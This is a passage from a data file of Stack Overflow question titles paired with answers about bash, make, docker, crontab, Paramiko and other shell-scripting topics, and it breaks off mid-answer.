    "How to detect availability of GUI in Bash/Shell?": "On macOS, there's not a clearly appropriate way to check this from a shell, as such. There's a programmatic way, and we can use an interpreted language to take advantage of that.\nHere's a little script that outputs one of three states, Mac GUI, Mac non-GUI, or X11:\n#!/bin/bash\n\ncheck_macos_gui() {\n  command -v swift >/dev/null && swift <(cat <<\"EOF\"\nimport Security\nvar attrs = SessionAttributeBits(rawValue:0)\nlet result = SessionGetInfo(callerSecuritySession, nil, &attrs)\nexit((result == 0 && attrs.contains(.sessionHasGraphicAccess)) ? 0 : 1)\nEOF\n)\n}\n\nif [ \"$(uname)\" = \"Darwin\" ]; then\n  if check_macos_gui; then\n    echo \"Mac GUI session\"\n  elif [ -n \"$DISPLAY\" ]; then\n    echo \"Mac X11 GUI session\"\n  else\n    echo \"Mac non-GUI session\"\n  fi\nelif [ -n \"$DISPLAY\" ]; then\n  echo \"X11 GUI session\"\nfi\nMacs can have an X server installed, in which case DISPLAY is defined. However, I don't know if your Electron app will work properly in that configuration. So, I detected it separately.",
    "Xcode 10 beta error while building my project?": "",
    "How to export variables from makefile rule?": "In general, variables do not pass from one rule to another. But there is a way to do this with target-specific variables:\nanother_rule: DB_USER=XXX\nanother_rule: DB_PASS=YYY                              \n\nanother_rule:\n    @echo user is ${DB_USER}\n    @echo pass is $(DB_PASS)\nIf writing so many extra lines for every rule is too tedious, you can wrap them in a function:\ndefine db_env\n$(1): DB_USER=XXX\n$(1): DB_PASS=YYY\nendef\n\n$(eval $(call db_env,another_rule))\nanother_rule:\n    @echo user is ${DB_USER}\n    @echo pass is $(DB_PASS)",
    "Startup script for a docker container": "You can commit the changes you made by:\nShort Command reference:\ndocker commit <container id or name>  <repository name>/<your image name>:<tage aka version>\nExample:\ndocker commit c3f279d17e0a  svendowideit/testimage:version3\nFull Reference:\nUsage:  docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]\n\nCreate a new image from a container's changes\n\nOptions:\n  -a, --author string    Author (e.g., \"John Hannibal Smith <hannibal@a-team.com>\")\n  -c, --change value     Apply Dockerfile instruction to the created image (default [])\n      --help             Print usage\n  -m, --message string   Commit message\n  -p, --pause            Pause container during commit (default true)\nThen you can use docker images to view your new Image after commit.\nTo run a container from your new Image:\ndocker run -d svendowideit/testimage:version3 <optional startup command>\nAnother way would be creating your own image via: dockerfile, I'm Just putting it here just incase we can help others.",
    "BASH shell expand arguments with spaces from variable [duplicate]": "It's possible to do this without either bash arrays or eval: This is one of the few places where the behavior of xargs without either -0 or -d extensions (a behavior which mostly creates bugs) is actually useful.\n# this will print each argument on a different line\n# ...note that it breaks with arguments containing literal newlines!\nxargs printf '%s\\n' <<<\"$ARGS\"\n...or...\n# this will emit arguments in a NUL-delimited stream\nxargs printf '%s\\0' <<<\"$ARGS\"\n\n# in bash 4.4, you can read this into an array like so:\nreadarray -t -d '' args < <(xargs printf '%s\\0' <<<\"$ARGS\")\nyourprog \"${args[@]}\" # actually run your programs\n\n# in bash 3.x or newer, it's just a bit longer:\nargs=( );\nwhile IFS= read -r -d '' arg; do\n    args+=( \"$arg\" )\ndone < <(xargs printf '%s\\0' <<<\"$ARGS\")\nyourprog \"${args[@]}\" # actually run your program\n\n# in POSIX sh, you can't safely handle arguments with literal newlines\n# ...but, barring that, can do it like this:\nset --\nwhile IFS= read -r arg; do\n    set -- \"$@\" \"$arg\"\ndone < <(printf '%s\\n' \"$ARGS\" | xargs printf '%s\\n')\nyourprog \"$@\" # actually run your program\n...or, letting xargs itself do the invocation:\n# this will call yourprog with ARGS given\n# ...but -- beware! -- will cause bugs if there are more arguments than will fit on one\n# ...command line invocation.\nprintf '%s\\n' \"$ARGS\" | xargs yourprog",
    "grep multipe wildcards in string": "Your attempt is very close. * in shell glob terms is roughly equivalent to .* in regex terms. . means \"any character\" and * is means \"repeated any number of times (including zero).\nYour regex just needs . before each *. The trailing * is not necessary:\npackage.*el6.*x86_64\nHere is a sample run with your input:\ngrep 'package.*el6.*x86_64' <<< \"Release 2.1 OS: RHEL File: package_el6_2.0.1.1_x86_64.rpm\nRelease 2.1 OS: RHEL File: package_el6_2.0.1.1_i686.rpm\nRelease 2.1 OS: RHEL File: package_el7_2.0.1.1_x86_64.rpm\nRelease 2.1 OS: RHEL File: package_el7_2.0.1.1_i686.rpm\"\nPrints:\nRelease 2.1 OS: RHEL File: package_el6_2.0.1.1_x86_64.rpm",
    "bash: sleep process not getting killed [duplicate]": "kill -15 22880 will send a signal to the shell executing the script, but not the sleep command. To send the signal to every process in the process group, you should be able to specify a negative process ID.\nkill -15 -22880\nAlternately, ensure that the script kills its children before exiting.\ntrap 'kill $(jobs -p)' EXIT\necho \"Sleeping...\"\nsleep 180s & wait\nIf you leave sleep in the foreground when the signal is received, the shell must wait until it exits before running the trap; sleep is uninterruptible. The workaround is to run it in the background, then wait on it. wait, being a shell built-in, can be interrupted, so that the trap runs immediately and kills any background processes still in progress.",
    "What's the point of eval/bash -c as opposed to just evaluating a variable?": "The third form is not at all like the other two -- but to understand why, we need to go into the order of operations when bash in interpreting a command, and look at which of those are followed when each method is in use.\nBash Parsing Stages\nQuote Processing\nSplitting Into Commands\nSpecial Operator Parsing\nExpansions\nWord Splitting\nGlobbing\nExecution\nUsing eval \"$string\"\neval \"$string\" follows all the above steps starting from #1. Thus:\nLiteral quotes within the string become syntactic quotes\nSpecial operators such as >() are processed\nExpansions such as $foo are honored\nResults of those expansions are split on characters into whitespace into separate words\nThose words are expanded as globs if they parse as same and have available matches, and finally the command is executed.\nUsing sh -c \"$string\"\n...performs the same as eval does, but in a new shell launched as a separate process; thus, changes to variable state, current directory, etc. will expire when this new process exits. (Note, too, that that new shell may be a different interpreter supporting a different language; ie. sh -c \"foo\" will not support the same syntax that bash, ksh, zsh, etc. do).\nUsing $string\n...starts at step 5, \"Word Splitting\".\nWhat does this mean?\nQuotes are not honored.\nprintf '%s\\n' \"two words\" will thus parse as printf %s\\n \"two words\", as opposed to the usual/expected behavior of printf %s\\n two words (with the quotes being consumed by the shell).\nSplitting into multiple commands (on ;s, &s, or similar) does not take place.\nThus:\ns='echo foo && echo bar'\n$s\n...will emit the following output:\nfoo && echo bar\n...instead of the following, which would otherwise be expected:\nfoo\nbar\nSpecial operators and expansions are not honored.\nNo $(foo), no $foo, no <(foo), etc.\nRedirections are not honored.\n>foo or 2>&1 is just another word created by string-splitting, rather than a shell directive.",
    "Line continuation + line comment, on the same line? [duplicate]": "No, but you can store the arguments in an array instead. This allows you to both comment out an individual line as well as include interspersed comments.\nargs=( --important-argument \"$ONE\"\n       --indispensable-flag \"$ENABLED\"\n       # --an-optional-toggle \"will probably be commented out some day\"\n       $ARGUMENTS  # in sorted order\n       $MORE_ARGUMENTS\n     )\nfoo-command \"${args[@]}\"\nNote that you will almost certainly want to make ARGUMENTS and MORE_ARGUMENTS arrays as well, so args would end up looking like\nargs=( --important-argument \"$ONE\"\n       --indispensable-flag \"$ENABLED\"\n       # --an-optional-toggle \"will probably be commented out some day\"\n       \"${ARGUMENTS[@]}\"  # in sorted order\n       \"${MORE_ARGUMENTS[@]}\"\n     )",
    "Running a shell command from a flask app [closed]": "It's a simple typo. cd in the following line should be cmd:\np = subprocess.Popen(cd, # <----\n                     stdout=subprocess.PIPE,\n                     stderr=subprocess.PIPE,\n                     stdin=subprocess.PIPE)\nUPDATE\nThere's another typo; remove a space in the second item:\ncmd = [\"ls\", \" -l\"]\n              ^",
    "Running a bash function with set -e without exiting the shell": "If you don't need the function to execute in the current shell (e.g., it isn't setting any parameter values that need to be visible to the caller), you can make the body of the function a subshell, not a command group:\ncurrent_dir () (\n    set -e\n    git foobar\n    echo \"I will not print this, because git foobar returned a non-zero exit code\"\n)",
    "meteorJS call a shell command from the server": "You can also use child_process.spawn().\nRead More about executing a UNIX command with Meteor.\nspawn = Npm.require('child_process').spawn;\n\ncommand = spawn('ls', ['-la']);\n\ncommand.stdout.on('data',  function (data) {\n  console.log('stdout: ' + data);\n});\n\ncommand.stderr.on('data', function (data) {\n  console.log('stderr: ' + data);\n});\n\ncommand.on('exit', function (code) {\n  console.log('child process exited with code ' + code);\n});",
    "Execute a command with a Bash variable in it and store the result": "If you need to do some kind of transformation on the data first, you can \"capture\" output with the following syntax:\nresult=\"$(iconv -f ISO-8859 -t UTF-8 $1)\"\nThere is a gotcha here as well: if you are going to be storing large amounts of data with potential whitespace or other meddlesome characters in it, be sure to always quote the variable (\"$result\" instead of $result) to ensure it gets treated as a single string.",
    "Awk replace a column with its hash value": "So, you don't really want to be doing this with awk. Any of the popular high-level scripting languages -- Perl, Python, Ruby, etc. -- would do this in a way that was simpler and more robust. Having said that, something like this will work.\nGiven input like this:\nthis is a test\n(E.g., a row with four columns), we can replace a given column with its md5 checksum like this:\nawk '{\n    tmp=\"echo \" $2 \" | openssl md5 | cut -f2 -d\\\" \\\"\"\ntmp | getline cksum\n$2=cksum\nprint\n}' < sample \nThis relies on GNU awk (you'll probably have this by default on a Linux system), and it uses openssl to generate the md5 checksum. We first build a shell command line in tmp to pass the selected column to the md5 command. Then we pipe the output into the cksum variable, and replace column 2 with the checksum. Given the sample input above, the output of this awk script would be:\nthis 7e1b6dbfa824d5d114e96981cededd00 a test",
    "add filename to beginning of file using find and sed": " find . -type f |xargs awk '$0=FILENAME$0' > out\nas I answered this, your \"no awk\" line not yet there. anyway, take a look my updated answer below:\nupdated based on comment\nso you want to use find, exec/xargs, and sed to do it. My script needs GNU Sed, i hope you have it.\nsee the one liner first: (well, > out is omitted. You could add it to the end of the line. )\nfind . -type f | xargs -i echo {}|sed -r 's#(.\\/)(.*)#cat &\\|sed  \"s:^:file \\2 :g\"#ge'\nnow let's take a test, see below:\nkent$  head *.txt\n==> a.txt <==\nA1\nA2\n\n==> b.txt <==\nB1\nB2\n\nkent$  find . -type f | xargs -i echo {}|sed -r 's#(.\\/)(.*)#cat &\\|sed  \"s:^:file \\2 :g\"#ge'\nfile b.txt B1\nfile b.txt B2\nfile a.txt A1\nfile a.txt A2\nis the result your expectation?\nShort explanation\nfind ....|xargs -i echo {} nothing to explain, just print the filename per line (with leading \"./\")\nthen pass the filename to a sed line like sed -r 's#(.\\/)(.*)# MAGIC\n#ge'\nremember that in the above line, we have two groups \\1: \"./\" and \\2 \"a.txt\"(filename)\nsince we have e at the end of sed line, the MAGIC part would be executed as shell command.(GNU sed needed)\nMAGIC: cat &\\|sed  \"s:^:file \\2 :g cat & is just output the file content, and pipe to another sed. do the replace (s:..:..:g)\nfinally, the execution result of MAGIC would be the Replacement of the outer sed.\nthe key is the 'e' of Gnu sed.",
    "How should I indicate that my Python shell script is returning an error?": "Most Shell utilites have various return values depending on the error that occurs.\nThe standard is when exiting with a status code of 0, it means the execution ended successfully.\nFor other error codes, this is highly dependant on the utility itself. You're most likely to learn about error codes in the man pages of the aforementioned utilities.\nHere's a simple example of the ls man page:\nExit status:\n   0      if OK,\n\n   1      if minor problems (e.g., cannot access subdirectory),\n\n   2      if serious trouble (e.g., cannot access command-line argument).\nIt's highly recommended that you document properly your utility's exit codes in order for its users to use it correctly.",
    "Unix: Print file name and line number of each line that exceeds 80 characters of each file in a folder": "Almost there! This will give you a grep-style output, useful in editors like Vim to be able to navigate the output:\nawk 'length > 80 {print FILENAME \"(\" FNR \"): \" $0}' *.cpp\nOr to give the format you asked for:\nawk 'length > 80 {print FILENAME \" line \" FNR \"\\n\\t\" $0}' *.cpp\nFILENAME and FNR (like NR, but for that particular file) are special variables in awk.\nOr you could use grep itself, of course:\ngrep -n '^.\\{80\\}' *.cpp",
    "How can I make npm projects with Bash shell commands work on Windows?": "Your basic choices for going cross-platform without platform-specific scripts are:\nUse Bash also on Windows:\nRun your npm scripts from Bash via WSL and use the existing Bash commands typically contained in package.json files, such as in your case.\nAlternatively, with Git for Windows installed, configure npm to use bash.exe as the shell for invoking commands - see this answer [npm v5.1+].\nInstall PowerShell (Core) on all your platforms (including Windows), and define the commands as PowerShell commands (see below) [npm v5.1+].\nNote the npm version version requirement (version 5.1 or higher) where noted, due to the configuration option to use a specific shell (script-shell) not being available in earlier versions. Run npm -v to get the installed version, and\nnpm install -g npm to update, if possible.\nUsing npm with PowerShell (Core) on all platforms [npm v5.1+]:\nInstall PowerShell Core.\nThen configure npm to use PowerShell (Core) as the shell (requires npm version 5.1 or higher):\nFor all your projects (current user), or globally (all users):\nnpm config set script-shell pwsh [--global]\nFor a given project only (from that project's root directory):\nnpm config set script-shell pwsh --location project\n\n# Equivalent in older npm versions:\nnpm config set script-shell pwsh --userconfig ./.npmrc\nFinally, in your projects' package.json's scripts key, define the commands as PowerShell commands.\nIn the case at hand:\nFor instance, translate this Bash command:\nyarn package-common && mv './dist/APP\u00ae TV.wgt' \"./package/$(yarn -s filename)\"\nNote: I've replaced '' with \", because the latter make more sense; as originally written, the '' are effectively discarded by Bash, and the result of command substitution $(yarn -s filename) could break the command if it contained whitespace.\nto this PowerShell command (v7+):\nyarn package-common && mi './dist/APP\u00ae TV.wgt' \"./package/$(yarn -s filename)\"\nNote:\nmi is a built-in alias for PowerShell's Move-Item cmdlet.\nWhile it makes sense to call your scripts from PowerShell also, that's not a requirement - calling from cmd.exe or a batch file will work too.\nTo get started with PowerShell (Core), see Learning PowerShell; also, http://hyperpolyglot.org/shell juxtaposes the syntax of POSIX-like shells such as Bash with that of cmd.exe and PowerShell in concise, tabular form.",
    "How to get docker 'objects' completion on mintty-bash from git for windows": "Not sure if this is the best way to do this or if it work properly at all, but it seems to work! Let me know if you find any strange behavior...\nMinimum requirements:\nGit for Windows (git bash / mintty terminal)\n7-Zip or similar to extract files\nInstallation:\nFirst of all, you will need the bash-completion package.\nI discovered that the package built for cygwin works.\nChoose a cygwin mirror: https://cygwin.com/mirrors.html\nNavigate to: /cygwin/noarch/release/bash-completion/\nDownload: bash-completion-2.7-1.tar.xz\nExtract it elsewhere\nCopy the etc and usr folder to C:\\Program Files\\Git (see the note below)\nDone, now you should have command completion enabled.\nTesting:\nYou can test it by opening a git bash terminal and typing:\ncurl --ver (hit tab twice)\nIt will suggests something like this:\n$ curl --ver\n--verbose  --version\nDocker commands:\nNow, about that docker commands...\nI have found my files here:\ndocker command: https://github.com/docker/docker-ce/blob/v17.09.0-ce/components/cli/contrib/completion/bash/docker\ndocker-compose command: https://github.com/docker/compose/blob/1.16.1/contrib/completion/bash/docker-compose\ndocker-machine command: https://github.com/docker/machine/blob/v0.12.2/contrib/completion/bash/docker-machine.bash\nJust download and copy them to: C:\\Program Files\\Git\\usr\\share\\bash-completion\\completions\\\nMake sure they are correctly named (remove the filename extension if any).\nIt should be named like this:\ndocker\ndocker-compose\ndocker-machine\nNo extra .txt or whatever...\nSome notes:\nI'm not sure if the package bash-completion-2.7.1 is the best version to work with git bash, I just got the latest one. (You can compare them and find it out)\nYou don't need to copy all the files from /usr/share/bash-completion/completions/, just the ones you want. (I didn't copy any of them).\nIt's a good idea to run a docker version, docker-compose version, docker-machine version and check the versions you are running, then download the correct files from the repository. (Choose the correct release tag for you).",
    "How does Docker run a command without invoking a command shell?": "If I understand your question correctly, you're asking how something can be run (specifically in the context of docker) without invoking a command shell.\nThe way things are run in the linux kernel are usually using the exec family of system calls.\nYou pass it the path to the executable you want to run and the arguments that need to be passed to it via an execl call for example.\nThis is actually what your shell (sh, bash, ksh, zsh) does under the hood anyway. You can observe this yourself if you run something like strace -f bash -c \"cat /tmp/foo\"\nIn the output of that command you'll see something like this:\nexecve(\"/bin/cat\", [\"cat\", \"/tmp/foo\"], [/* 66 vars */]) = 0\nWhat's really going on is that bash looks up cat in $PATH, it then finds that cat is actually an executable binary available at /bin/cat. It then simply invokes it via execve. and the correct arguments as you can see above.\nYou can trivially write a C program that does the same thing as well. This is what such a program would look like:\n#include<unistd.h>\n\nint main() {\n\n    execl(\"/bin/cat\", \"/bin/cat\", \"/tmp/foo\", (char *)NULL);\n\n    return 0;\n}\nEvery language provides its own way of interfacing with these system calls. C does, Python does and Go, which is what's used to write Docker for the most part, does as well. A RUN instruction in the docker likely translates to one of these exec calls when you hit docker build. You can run an strace -f docker build and then grep for exec calls in the log to see how the magic happens.\nThe only difference between running something via a shell and directly is that you lose out on all the fancy stuff your shell will do for you, such as variable expansion, executable searching etc.",
    "Bash/SH, Same command different output?": "Per POSIX, echo supports no options.\nTherefore, when echo -n is run with sh, it outputs literal -n instead of interpreting -n as the no-trailing-newline option:\n$ sh -c 'echo -n \"apple\"'\n-n apple                  # !! Note the -n at the beginning.\nNote: Not all sh implementations behave this way; some, such as on Ubuntu (where dash acts as sh), do support the -n option, but the point is that you cannot rely on that, if your code must run on multiple platforms.\nThe portable POSIX-compliant way to print to stdout is to use the printf utility:\nprintf %s \"apple\" | shasum -a 256",
    "Shell globbing exclude directory patterns": "Michael's answer is right. ** matches too much (greedy match), including assets.\nSo, with this tree:\n.\n|-- a\n|   |-- a1\n|   |   +-- assets\n|   |       |-- a1-1\n|   |       |   +-- a1-1.js\n|   |       +-- a1-2\n|   |           +-- a1-2.js\n|   +-- a2\n|       +-- a2.js\n|-- assets\n|   +-- xyz.js\n|-- b\n|   |-- b1\n|   |   +-- b1-2\n|   |       +-- b1-2-3\n|   |           |-- assets\n|   |           |   +-- b1-2-3.js\n|   |           +-- test\n|   |               |-- test2\n|   |               |   +-- test3\n|   |               |       +-- test4\n|   |               |           +-- test4.js\n|   |               +-- test.js\n|   +-- b.js\n|-- c\n|   +-- c.js\n+-- x.js\nThe .js files are:\n$ find . -name '*.js'\n./x.js\n./assets/xyz.js\n./a/a2/a2.js\n./a/a1/assets/a1-2/a1-2.js\n./a/a1/assets/a1-1/a1-1.js\n./c/c.js\n./b/b.js\n./b/b1/b1-2/b1-2-3/test/test2/test3/test4/test4.js\n./b/b1/b1-2/b1-2-3/test/test.js\n./b/b1/b1-2/b1-2-3/assets/b1-2-3.js\nThere is a bash variable GLOBIGNORE to do exactly what you are trying to do.\nSo, this would work:\n$ GLOBIGNORE='**/assets/**:assets/**:**/assets'\n$ ls -1 **/*.js\na/a2/a2.js\nb/b1/b1-2/b1-2-3/test/test2/test3/test4/test4.js\nb/b1/b1-2/b1-2-3/test/test.js\nb/b.js\nc/c.js\nx.js",
    "Is there a simple way to get rid of junk values that come when you SSH using Python's Paramiko library and fetch output from CLI of a remote machine?": "It's not a junk. These are ANSI escape codes that are normally interpreted by a terminal client to pretty print the output.\nIf the server is correctly configured, you get these only, when you use an interactive terminal, in other words, if you requested a pseudo terminal for the session (what you should not, if you are automating the session).\nThe Paramiko automatically requests the pseudo terminal, if you used the SSHClient.invoke_shell, as that is supposed to be used for implementing an interactive terminal. See also How do I start a shell without terminal emulation in Python Paramiko?\nIf you automate an execution of remote commands, you better use the SSHClient.exec_command, which does not allocate the pseudo terminal by default (unless you override by the get_pty=True argument).\nstdin, stdout, stderr = client.exec_command('ls')\nSee also What is the difference between exec_command and send with invoke_shell() on Paramiko?\nOr as a workaround, see How can I remove the ANSI escape sequences from a string in python.\nThough that's rather a hack and might not be sufficient. You might have other problems with the interactive terminal, not only the escape sequences.\nYou particularly are probably not interested in the \"Last login\" message and command-prompt (cli@BENU>) either. You do not get these with the exec_command.\nIf you need to use the \"shell\" channel due to some specific requirements or limitations of the server, note that it is technically possible to use the \"shell\" channel without the pseudo terminal. But Paramiko SSHClient.invoke_shell does not allow that. Instead, you can create the \"shell\" channel manually. See Can I call Channel.invoke_shell() without calling Channel.get_pty() beforehand, when NOT using Channel.exec_command().\nAnd finally the u is not a part of the actual string value (note that it's outside the quotes). It's an indication that the string value is in the Unicode encoding. You want that!",
    "Redirection and pipe behavior in bash vs. zsh": "Read the MULTIOS documentation in the zshmisc man page. It's a feature of zsh which causes it to redirect the output to multiple files at the same time, and it can also be a pipe.\ne.g.\nls >a >b\nwill get both a and b populated with the content of the directory.\nfrom the zshmisc documentation:\nIf the user tries to open a file descriptor for writing more than once, the shell opens the file descriptor as a pipe to a process that copies its input to all the specified outputs, similar to tee, provided the MULTIOS option is set, as it is by default. Thus:\ndate >foo >bar\nwrites the date to two files, named foo and bar. Note that a pipe is an implicit redirection; thus\ndate >foo | cat\nwrites the date to the file foo, and also pipes it to cat.\nTo turn it on you do setopt multios, to turn off you do setopt nomultios:\n$ setopt nomultios\n$ ls -l > x | wc -l\n0\n$ setopt multios\n$ ls -l > x | wc -l\n36",
    "Why sys.path doesn't contain cwd()?": "You do not want to add cwd() to the sys.path. Always adding cwd() would be a terrible idea as you can no longer control what files are available for import.\nPython adds the directory of the script being executed instead.\nE.g. when you run:\npython.exe path/to/script.py\nthen path/to is automatically added to the sys.path.\nOnly if you run a script from the current directory is '' added to the start of the path, meaning the current working directory is searched for imports. E.g. when you run python.exe localfile.py then Python does add the current working directory, in the assumption you wont't change the current working directory while importing.\nSee Interface options in the Command line and environment documentation:\nIf the script name refers directly to a Python file, the directory containing that file is added to the start of sys.path, and the file is executed as the __main__ module.\nand the sys.path documentation:\nAs initialized upon program startup, the first item of this list, path[0], is the directory containing the script that was used to invoke the Python interpreter. If the script directory is not available (e.g. if the interpreter is invoked interactively or if the script is read from standard input), path[0] is the empty string, which directs Python to search modules in the current directory first. Notice that the script directory is inserted before the entries inserted as a result of PYTHONPATH.\nYou can always add the current working directory to sys.path explicitly:\nimport sys\n\nif sys.path[0] != '':\n    sys.path.insert(0, '')\nBe careful, any python file or package in that working directory with a name matching a module you are already using in your code will mask that module, easily leading to breakage.",
    "How to check if currently running shell is BusyBox": "Another way requiring Linux and readlink:\n#!/bin/ash\nexe=`exec 2>/dev/null; readlink \"/proc/$$/exe\"`\ncase \"$exe\" in\n*/busybox)\n    echo \"It's a busybox shell.\"\n    ;;\nesac",
    "Get error when I run Hbase shell": "I also met the same problem and struggled for a long time. Following the instructions here, before run ./bin/hbase shell command you should use ./bin/start-hbase.sh first. Then my problem was solved.",
    "Nested quotes bash [duplicate]": "You can still place single quotes as long as the variables are intended to be initially expanded before the whole command string is executed on the shell on the remote server.\nsudo ssh server \"echo \\\"$SOMEVAR\\\"; awk '/pattern/{print \\\"hello\\\"}1' file > file.tmp\"",
    "How to run SVN export without the prompt of username and password": "I do this same thing in one of my build scripts, although I also use this parameter --non-interactive (do no interactive prompting) and it seems to work pretty well.\nSo your command would look something like this:\nsvn export --username bavhbavh --password blahblah --non-interactive svn://svn.someSite.com/folder/folder2/exportFile\"",
    "How to minimize git merge conflicts?": "The number one reason for merge conflicts is the time between each merge.\nThe longer you wait between each merge, the surer you get to see merge conflicts.\nYou can minimize that by choosing a merge workflow (like git flow for instance) which will advocate for branch per feature, and facilitate the isolation of tasks.\nBut as long as a common set of files is involved (in two different developments), you will end up with merge conflicts, especially if you wait too long.\nSo with a distributed VCS, learn to publish (push/pull) regularly, and learn to rebase before merging.\nNot only will that decrease the number of conflicts, it will also reduce the number of semantic conflicts: those are merges which seem automatic (no conflicts), but produce an incorrect code.\nSee \"Better, simpler example of 'semantic conflict'?\".",
    "Writing a shell script to install cron job": "Simple Answer to Original Question\nIt all seems like routine shell scripting:\n# Clobber previous edition of script!\ncronscript=$HOME/scripts/cronSqlprocedure.sh\ncat <<EOF > $cronscript\nexport ORACLE_HOME=/opt/app/oracle/product/11.2.0/dbhome_1\nexport PATH=\\$ORACLE_HOME/bin:\\$PATH\nexport ORACLE_SID=HEER\n...and whatever else is needed...\nEOF\nchmod u+x $cronscript\n\n# Add to crontab\ntmp=${TMPDIR:-/tmp}/xyz.$$\ntrap \"rm -f $tmp; exit 1\" 0 1 2 3 13 15\ncrontab -l | sed '/cronSqlprocedure.sh/d' > $tmp  # Capture crontab; delete old entry\necho \"0,15,30,45 * * * * $cronscript\" >> $tmp\ncrontab < $tmp\nrm -f $tmp\ntrap 0\nThe trap stuff ensures minimum damage if the user decides to interrupt, cleaning up the temporary file. Note that the old version of the script, if any, has already been clobbered. If you wanted to, you could arrange to create the script into another temp file, and only finish the moving when your satisfied. I typically use I/O redirection on the crontab command; you can perfectly well supply the file name as an argument.\nNote the escapes on \\$ORACLE_HOME and \\$PATH that William Pursell correctly pointed out should be present on \\$ORACLE_HOME and should (perhaps) be present on \\$PATH. You need to decide whether you want to take the cron-provided (totally minimal) value of $PATH (in which case you want the backslash) or whether you want to use the user's current value of $PATH in the cron script. Either could be correct - just be aware of which you choose and why. Remember, the environment provided by cron is always minimal; you will get a setting for PATH, HOME, maybe TZ, probably USER and possibly LOGNAME; that may be all. If you're not sure, try running a crontab entry which captures the environment in a file:\n* * * * * env > /tmp/cron.env\nYou're likely to find that the file is small. Don't forget to remove the entry after testing it.\nOne good thing that you're to be commended for:\nYour script (a) ensures that it sets the environment, and (b) runs a simple command from the crontab entry, leaving the script to do the hard work.\nIn my view, the entries in the crontab file should indeed be simple like that, invoking a purpose-built script to do the real work.\nCritique of Proposed Script in the Revised Question\n#!/bin/bash\nORACLE_HOME=\"/opt/app/oracle/product/11.2.0/dbhome_1\"\nORACLE_SID=\"HEER\"\nORACLE_USER=\"USER1\"\nORACLE_PASSWORD=\"USERPASS\"\nThus far, no problem:\necho \"export ORACLE_HOME=$ORACLE_HOME\" >> $PWD/sqlcronprocedure.sh\necho \"export PATH=\\$ORACLE_HOME/bin:\\$PATH\" >> $PWD/sqlcronprocedure.sh\necho \"export ORACLE_SID=$ORACLE_SID\" >> $PWD/sqlcronprocedure.sh\necho \"rTmpDir=/tmp\" >> $PWD/sqlcronprocedure.sh\n\necho \"sqlplus -s $ORACLE_USER@$ORACLE_SID/$ORACLE_PASSWORD  > $rTmpDir/deleteme.txt 2>&1 <<EOF\" >> $PWD/sqlcronprocedure.sh\necho \"    select 1 from dual;\" >> $PWD/sqlcronprocedure.sh\necho \"    execute prvsapupd(1000,14);\" >> $PWD/sqlcronprocedure.sh\necho \"EOF\" >> $PWD/sqlcronprocedure.sh\nThis is horribly repetitive, and starting out with append is not good. I would use:\ncronscript=$PWD/sqlcronprocedure.sh\n{\necho \"export ORACLE_HOME=$ORACLE_HOME\"\necho \"export PATH=\\$ORACLE_HOME/bin:\\$PATH\"\necho \"export ORACLE_SID=$ORACLE_SID\"\necho \"rTmpDir=/tmp\"\n\necho \"sqlplus -s $ORACLE_USER@$ORACLE_SID/$ORACLE_PASSWORD  > $rTmpDir/deleteme.txt 2>&1 <<EOF\"\necho \"    select 1 from dual;\"\necho \"    execute prvsapupd(1000,14);\"\necho \"EOF\"\n} > $cronscript\nThe { ... } apply the I/O redirection to the enclosed commands. Note that there must be a semi-colon or newline before the }.\nchmod 755 $PWD/sqlcronprocedure.sh\nSince I have a variable for the file name, I'd use it:\nchmod 755 $cronscript\nThen we have a problem with repetition here, plus not cleaning up behind ourselves:\ncrontab -l > $PWD/sqlcorn.sh\necho \"0,15,30,45 * * * * $PWD/sqlcronprocedure.sh\" >> $PWD/sqlcorn.sh\ncrontab $PWD/sqlcorn.sh\nThus I'd write:\ncrontab=sqlcron.sh\ncrontab -l > $crontab\necho \"0,15,30,45 * * * * $cronscript\" >> $crontab\ncrontab $crontab\nrm -f $crontab\nI still think that trap is not too hard and should be used in any script that creates temporary files; however, it's your mess, not mine. I'm not convinced the $PWD is needed everywhere; I left it in one name and not in the other. If you don't supply a directory path, the $PWD is implied. I also note that you're using a slightly different script name in your proposed full script from the one in the original. As long as the names are self-consistent, there isn't a problem (and using a variable helps ensure consistency), but be careful.\nI'm not sure that I'd actually do it this way, but you could also avoid the temporary file using:\n{\ncrontab -l\necho \"0,15,30,45 * * * * $cronscript\"\n} | (sleep 1; crontab -)\nThis collects the current value and appends the extra line, feeding all that into a script that sleeps for a second (to allow the first part time to complete) before feeding the results back into crontab. There's a question of how reliable is the one second delay, mainly. It's likely fine, but not guaranteed. The temporary file is 100% reliable - I'd use it because it isn't any more complex. (I could use parentheses around the first pair of commands; I could use braces around the second pair of commands, but I'd need to add a semi-colon between the - and the ) that is replaced by }.)\nNote that my original proposal was careful to ensure that even if the script was run multiple times, there'd be only one entry in the crontab file for the process. Your variants do not make sure of the idempotency.",
    "What's wrong with the following GNU make shell variable expansion?": "when using $ for Bash inside a Makefile, you need to double them: $$a for example. I'm not familiar with the notation $' but I'll have to assume you know what you're doing with that. unless it's a Makefile construct, you need to double the dollar sign on that one too.\nalso, the hash sign # is terminating the shell expansion in Make's evaluation, which is why it never sees the right paren. escaping it helps, but I don't have it working quite right yet.\nI'm debugging it by having two steps: first is setting GCCVER to be the list of commands without the enclosing $(shell), then in the 2nd step setting GCCVER := $(shell $(GCCVER)). you might want to try that too, commenting out the $(shell) step when it doesn't work, using export, and making a \"set\" recipe:\nGCCVER := some commands here\n#GCCVER := $(shell $(GCCVER))  # expand the commands, commented out now\nexport  # all variables available to shell\nset:\n        set  # make sure this is prefixed by a tab, not spaces\nThen:\nmake set | grep GCCVER\n[update] this works:\nGCCVER := a=`mktemp` && echo -e '\\#include <stdio.h>\\nmain() {printf(\"%u.%u\\\\n\", __GNUC__, __GNUC_MINOR__);}' | gcc -o \"$$a\" -xc -; \"$$a\"; rm \"$$a\"\nGCCVER := $(shell $(GCCVER))\nexport\ndefault:\n    set\n\njcomeau@intrepid:/tmp$ make | grep GCCVER\nGCCVER=4.6\nAnd full circle, having gotten rid of the extra step:\njcomeau@intrepid:/tmp$ make | grep GCCVER; cat Makefile \nGCCVER=4.6\nGCCVER := $(shell a=`mktemp` && echo -e '\\#include <stdio.h>\\nmain() {printf(\"%u.%u\\\\n\", __GNUC__, __GNUC_MINOR__);}' | gcc -o \"$$a\" -xc -; \"$$a\"; rm \"$$a\")\nexport\ndefault:\n    set\nUsing the $' Bash construct:\njcomeau@intrepid:/tmp$ make | grep GCCVER; cat Makefile \nGCCVER=4.6\nGCCVER := $(shell a=`mktemp` && echo $$'\\#include <stdio.h>\\nmain() {printf(\"%u.%u\\\\n\", __GNUC__, 